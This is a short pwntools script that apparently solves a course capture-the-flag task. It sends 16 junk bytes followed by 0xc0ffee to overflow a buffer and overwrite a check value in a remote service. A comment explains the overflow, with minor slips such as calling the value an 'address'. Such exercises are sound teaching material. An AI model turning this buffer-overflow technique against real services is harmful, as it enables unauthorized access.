#!/usr/bin/python3

from pwn import *
from pwn import p64

io = remote('inf226.puffling.no', 7000)

line = cyclic(16) + p64(0xc0ffee)
io.sendline(line)


recieved = io.recvall().decode()
flag = recieved.splitlines()[-1]
print(f'Flag 00: {flag}')

 
'''
From the source code:
The buffer to store user input is of size 16 bytes,
and the structure locals contains this buffer, as well
as an int_32 check, which is initialized to 0xabcdc3cf.
The if-statements makes sure the flag is surrendered if
the check member of locals contains 0x00coffee, and so
if we send 16 junk bytes as well as this address to the
program, we retrieve the flag.
'''